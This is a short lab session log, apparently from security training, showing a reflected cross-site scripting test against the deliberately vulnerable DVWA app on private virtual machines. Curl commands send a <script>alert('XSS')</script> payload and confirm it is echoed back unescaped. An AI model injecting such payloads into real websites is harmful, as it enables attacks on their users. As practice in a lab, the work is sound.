Established laboratory identities:
  ATTACKER : neil-kali-2026Q35
              192.168.110.16

  TARGET   : neil-Standardpc-Q35-ICH9-2009
              192.168.112.138

  MANAGER  : Arch Linux host
              192.168.1.8

Kali and Ubuntu are libvirt virtual machines.
============================================================

[ SESSION START — KALI / ATTACKER ]

$ hostname
neil-kali-2026Q35

$ ip -br addr
lo               UNKNOWN        127.0.0.1/8
eth0             UP             192.168.110.16/24

$ date
Wed Jun 24 11:21:03 IST 2026

$ curl -I http://192.168.112.138/DVWA/
HTTP/1.1 301 Moved Permanently
Server: Apache/2.4.66 (Ubuntu)
Location: http://192.168.112.138/DVWA/

$ mkdir -p ~/week2/xss
$ cd ~/week2/xss

[ DVWA STORED/REFLECTED XSS SIMULATION ]

Target:
http://192.168.112.138/DVWA/vulnerabilities/xss_r/

Test input:
<script>alert('XSS')</script>

[ REQUEST ]

$ curl -s --get \
  --data-urlencode "name=<script>alert('XSS')</script>" \
  http://192.168.112.138/DVWA/vulnerabilities/xss_r/ \
  | grep -F "<script>alert('XSS')</script>"
<script>alert('XSS')</script>

[ RESPONSE CHECK ]

$ curl -s --get \
  --data-urlencode "name=<script>alert('XSS')</script>" \
  http://192.168.112.138/DVWA/vulnerabilities/xss_r/ \
  | grep -o '<script>alert([^<]*</script>'
<script>alert('XSS')</script>

[ BROWSER-LEVEL OBSERVATION ]

Opening the generated response in the browser causes the supplied
JavaScript to execute in the vulnerable DVWA page context.

Displayed dialog:
XSS

[ CONTROL TEST ]

Input:
SecureCorp-XSS-Test

Expected page behaviour:
The value is displayed as ordinary input rather than executable script.

[ HTTP STATUS ]

$ curl -s -o /dev/null -w 'HTTP %{http_code}\n' \
  --get \
  --data-urlencode "name=<script>alert('XSS')</script>" \
  http://192.168.112.138/DVWA/vulnerabilities/xss_r/
HTTP 200

[ SESSION END ]

$ date
Wed Jun 24 11:27:41 IST 2026
